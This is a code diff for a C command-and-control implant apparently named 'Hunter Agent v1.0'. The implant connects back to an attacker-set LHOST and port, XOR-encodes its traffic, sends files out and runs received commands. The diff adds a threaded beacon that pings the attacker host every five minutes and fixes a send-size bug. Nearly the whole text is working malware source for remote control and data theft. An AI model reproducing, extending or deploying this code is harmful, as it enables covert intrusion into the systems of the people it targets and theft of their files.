@@ -7,10 +7,26 @@
 #include <signal.h>
 #include "helpers.c"
 #include "payload_common.h"
+#include <pthread.h>
 
 #define MAXBUF 65536
 
 #define SIZE 1024
+
+char* key = KEY;
+int connection_established;
+int sock;
+
+void* Callback(){
+	char* callback = "--HEADHUNTER BEACON--";
+	char* xorcallback = XOR(callback, key, strlen(callback), strlen(key));
+
+	while(connection_established == 0){
+		send(sock, xorcallback, strlen(callback), 0);
+		sleep(300);
+	}
+	
+}
 
 int sendfile(FILE* fp, int fd, char* key)
 {
@@ -18,7 +34,7 @@ int sendfile(FILE* fp, int fd, char* key)
         
         while(fgets(data, SIZE, fp) != NULL) {
                 char* xordata = XOR(data, key, SIZE, strlen(key));
-                if (send(fd, xordata, sizeof(data), 0) == -1) {
+                if (send(fd, xordata, SIZE, 0) == -1) {
                         exit(1);
                 }
                 bzero(data, SIZE);
@@ -37,24 +53,25 @@ int main(void)
 
 	signal(SIGCHLD, SIG_IGN);
 
-	int connection_established;
 	char* ip = LHOST;
-	char* key = KEY;
 	int keylen = strlen(key);
 	int port = PORT;
 	int n = 0;
 	char buf[MAXBUF];
-
+	pthread_t callback;
 	struct sockaddr_in sa;
 	sa.sin_family = AF_INET;
 	sa.sin_port = htons(port);
 	sa.sin_addr.s_addr = inet_addr(ip);
 
-	int sock = socket(AF_INET, SOCK_STREAM, 0);
+	sock = socket(AF_INET, SOCK_STREAM, 0);
 	do {
 		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
 	} while(connection_established != 0);
 
+	pthread_create(&callback, NULL, Callback, NULL);
+	
+	sleep(1);
 	char* xorhello = XOR("Hunter Agent v1.0\n", key, 18, keylen);
 	write(sock, xorhello, 18);
 
@@ -77,6 +94,7 @@ int main(void)
 				pid_t child_pid;
 				FILE* fp;
 				
+
 				
 				char* cmd = split(xorbuf, " ");			
 	
@@ -151,6 +169,7 @@ int main(void)
 				char* xordisconnect = XOR(disconnect, key, strlen(disconnect), keylen);
 				write(sock, xordisconnect, strlen(disconnect));
 				free(xordisconnect);
+				pthread_cancel(callback);
 				return 0;
 			}
 			else
